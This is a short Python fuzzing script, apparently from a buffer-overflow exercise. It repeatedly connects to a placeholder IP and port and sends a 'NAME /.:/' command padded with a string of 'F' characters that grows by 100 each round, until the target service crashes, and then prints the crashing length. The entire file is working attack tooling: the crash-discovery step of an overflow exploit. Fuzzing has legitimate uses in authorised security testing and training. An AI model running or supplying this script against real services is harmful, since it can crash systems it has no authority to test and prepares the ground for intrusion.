#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "F" * 100
 
while True:
    try:
        payload = "NAME /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('IP',PORT))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "F"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
